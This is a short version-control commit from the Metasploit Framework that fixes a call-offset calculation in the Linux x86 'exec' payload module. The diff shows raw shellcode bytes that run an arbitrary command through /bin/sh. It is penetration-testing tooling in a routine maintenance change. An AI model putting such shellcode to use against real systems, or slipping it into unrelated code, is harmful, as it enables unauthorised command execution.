6df72d9f410c23bf9ef20bf0dff5aac67cdcd4f5
HD Moore <hd_moore@rapid7.com>
2007-02-18 22:38:54 +0000

    Patch from GML to fix call calculation
    git-svn-id: file:///home/svn/framework3/trunk@4438 4d416f70-5f16-0410-b530-b9f4589650da

--- modules/payloads/singles/linux/x86/exec.rb
+++ modules/payloads/singles/linux/x86/exec.rb
@@ -1,5 +1,5 @@
 ##
-# $Id:$
+# $Id$
 ##
 
 ##
@@ -55,7 +55,7 @@ module Exec
 		payload =
 			"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68" +
 			"\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52" +
-			Rex::Arch::X86.call(cmd.length) + cmd + "\x00"     +
+			Rex::Arch::X86.call(cmd.length + 1) + cmd + "\x00"     +
 			"\x57\x53\x89\xe1\xcd\x80"
 	end
 
